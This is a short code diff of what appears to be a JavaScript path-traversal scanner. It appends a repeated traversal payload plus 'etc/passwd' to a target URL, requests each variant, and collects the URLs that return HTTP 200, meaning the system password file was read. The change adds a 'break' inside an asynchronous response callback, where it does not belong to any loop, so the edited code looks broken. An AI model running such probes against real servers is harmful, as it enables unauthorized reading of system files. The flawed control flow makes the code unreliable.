@@ -10,11 +10,16 @@ for (let i = 0; i < 10; i++) {
     let victim_url = url + payload.repeat(i + 1) + "etc/passwd";
     http.request(victim_url, (response) => {
     const status = response.statusCode;
-    if(status == 200){
-        success_url.push(victim_url); 
-    }
+
     console.log(status);
+
+    if(status == 200){
+        success_url.push(victim_url);
+        break;
+    }
+
     console.log(success_url);
+    
     })
 }
 console.log(success_url);
